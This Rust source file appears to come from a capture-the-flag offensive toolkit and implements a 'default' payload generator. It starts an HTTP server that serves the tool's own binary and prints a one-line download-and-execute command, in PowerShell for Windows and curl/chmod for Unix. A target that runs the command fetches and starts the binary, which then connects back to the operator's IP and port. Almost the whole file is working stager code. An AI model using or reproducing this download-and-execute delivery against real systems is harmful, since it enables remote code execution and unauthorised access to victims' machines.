use std::env;
use std::fs::File;
use std::io::{Read, Write};
use std::net::TcpListener;

use colored::Colorize;

use crate::payloads::{Payload, Platform};

pub struct PayloadDefault;

impl Payload for PayloadDefault {
    fn name(&self) -> String {
        String::from("default")
    }

    fn description(&self) -> String {
        String::from("Generate a command to download and execute CTF-Tools.")
    }

    #[allow(unreachable_code)]
    fn generate(&self, ip: &str, port: &str, platform: Platform) -> Result<(), String> {
        let mut http_port: u16 = 9555;
        //Bind a TCP listener on an available port
        let listener = loop {
            match TcpListener::bind(format!("0.0.0.0:{}", http_port)) {
                Ok(listener) => break listener,
                Err(e) => {
                    http_port += 1;
                    if http_port > 9999 {
                        panic!("Error while starting tcp server: {}", e);
                    }
                }
            }
        };
        //Get CTF Tools binary path
        let mut path = env::current_exe().unwrap();
        #[cfg(windows)]
        match platform {
            Platform::Unix => {
                let pathbuf = env::current_dir().unwrap().join("ctftools");
                if !pathbuf.exists() {
                    return Err(format!(
                        "{} doesn't exist, please download it from https://github.com/dd060606/CTF-Tools/releases and place it in the same directory as the current CTF-Tools executable!",
                        pathbuf.to_string_lossy()
                    ));
                }
                path = pathbuf;
            }
            _ => {}
        }
        #[cfg(unix)]
        match platform {
            Platform::Windows => {
                let pathbuf = env::current_dir().unwrap().join("ctftools.exe");
                if !pathbuf.exists() {
                    return Err(format!(
                        "{} doesn't exist, please download it from https://github.com/dd060606/CTF-Tools/releases and place it in the same directory as the current CTF-Tools executable!",
                        pathbuf.to_string_lossy()
                    ));
                }
                path = pathbuf;
            }
            _ => {}
        }

        //Generate the payload
        let dl_url = format!("http://{}:{}", ip, http_port);
        let cmd = match platform {
            Platform::Windows => {
                format!(
                    r#"powershell -Command "Invoke-WebRequest -Uri '{}' -OutFile 'ctftools.exe'; Start-Process 'ctftools.exe' -ArgumentList '{}', '{}'""#,
                    dl_url, ip, port
                )
            }
            Platform::Unix => {
                format!(
                    r#"curl -sL {} -o ctftools && chmod +x ctftools && ./ctftools {} {}"#,
                    dl_url, ip, port
                )
            }
            _ => "".to_string(),
        };
        success!("Payload: {}", cmd);

        success!(
            "Waiting for HTTP connections on {}...",
            format!("0.0.0.0:{}", http_port)
        );

        //Waiting for HTTP connections
        for stream in listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let mut buffer = [0; 1024];
                    if let Ok(_) = stream.read(&mut buffer) {
                        let (status_line, contents) = match File::open(path) {
                            Ok(mut file) => {
                                let mut contents = Vec::new();
                                if file.read_to_end(&mut contents).is_ok() {
                                    ("HTTP/1.1 200 OK\r\n\r\n", contents)
                                } else {
                                    (
                                        "HTTP/1.1 500 Internal Server Error\r\n\r\n",
                                        b"Internal Server Error".to_vec(),
                                    )
                                }
                            }
                            Err(_) => {
                                ("HTTP/1.1 404 NOT FOUND\r\n\r\n", b"File Not Found".to_vec())
                            }
                        };

                        let response = [status_line.as_bytes(), &contents].concat();
                        if let Err(e) = stream.write_all(&response) {
                            return Err(format!("Failed to send response: {}", e));
                        }
                        success!("The executable seems to have been downloaded, you should receive a connection shortly");
                        return Ok(());
                    }
                }
                Err(e) => {
                    return Err(format!("Connection failed: {}", e));
                }
            }
        }
        Ok(())
    }
    fn platform(&self) -> Platform {
        Platform::All
    }
}
